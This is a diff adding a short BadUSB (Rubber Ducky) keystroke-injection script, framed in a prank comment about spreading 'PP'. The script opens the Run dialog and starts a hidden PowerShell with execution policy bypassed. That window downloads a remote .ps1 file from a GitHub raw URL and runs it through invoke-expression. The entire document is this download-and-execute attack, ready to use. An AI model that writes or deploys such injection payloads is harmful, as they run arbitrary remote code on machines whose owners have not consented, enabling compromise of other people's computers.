@@ -1,0 +1,8 @@
+REM Spread the gospel far and wide, everyone deserves a little more PP in their lives
+
+GUI m
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/Brereid98/BADUSB_Files/main/ppwp.ps1?dl=1; invoke-expression $pl
+ENTER
